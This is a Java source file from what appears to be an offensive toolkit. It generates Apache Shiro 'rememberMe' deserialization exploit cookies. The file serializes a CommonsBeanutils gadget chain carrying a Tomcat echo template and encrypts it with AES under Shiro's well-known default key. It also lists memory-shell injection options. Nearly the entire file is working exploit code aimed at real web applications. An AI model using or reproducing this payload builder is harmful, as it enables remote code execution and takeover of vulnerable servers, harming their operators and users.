package com.summersec.attack.deser.frame;

import com.summersec.attack.core.AttackService;
import com.summersec.attack.deser.payloads.ObjectPayload;
import com.summersec.attack.deser.util.Gadgets;
import com.summersec.attack.deser.util.GadgetsK;
import com.summersec.attack.utils.AesUtil;
import com.mchange.v2.ser.SerializableUtils;
import java.util.Arrays;
import java.util.List;
import javax.xml.bind.DatatypeConverter;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;



public class Shiro implements FramePayload {
    @Override
    public String sendpayload(Object ChainObject) throws Exception {
        return null;
    }


    @Override
    public String sendpayload(Object chainObject, String key) throws Exception {
        byte[] serpayload = SerializableUtils.toByteArray(chainObject);

        byte[] bkey = DatatypeConverter.parseBase64Binary(key);

        byte[] encryptpayload = null;

        if (AttackService.aesGcmCipherType == 1) {
            AesCipherService aesCipherService = new AesCipherService();
            ByteSource byteSource = aesCipherService.encrypt(serpayload, bkey);
            encryptpayload = byteSource.getBytes();
        } else {
            encryptpayload = AesUtil.encrypt(serpayload, bkey);
        }

        return "rememberMe=" + DatatypeConverter.printBase64Binary(encryptpayload);
    }



    public static void main(String[] args) throws Exception {
        Class<? extends ObjectPayload> gadgetClazz = ObjectPayload.Utils.getPayloadClass("CommonsBeanutilsString");
        ObjectPayload<?> gadgetpayload = gadgetClazz.newInstance();


        List<String> echoList = Arrays.asList(new String[] { "TomcatEcho", "Tomcat1Echo", "InjectMemTool", "SpringEcho", "NoEcho", "JbossEcho", "WeblogicEcho", "TomcatHeaderEcho", "InjectMemTool" });

        String option = "TomcatEcho";

        Object template = null;
        Object chainObject = null;
        if (echoList.contains(option)) {
            template = Gadgets.createTemplatesImpl(option);
        } else {
            template = GadgetsK.createTemplatesTomcatEcho();
        }

        Shiro shiro = new Shiro();
        if (template != null && !option.equals("Resin4Echo")) {
            chainObject = gadgetpayload.getObject(template);
            String sendpayload = shiro.sendpayload(chainObject, "kPH+bIxk5D2deZiIxcaaaA==");
            System.out.println(sendpayload);
        }
    }
}



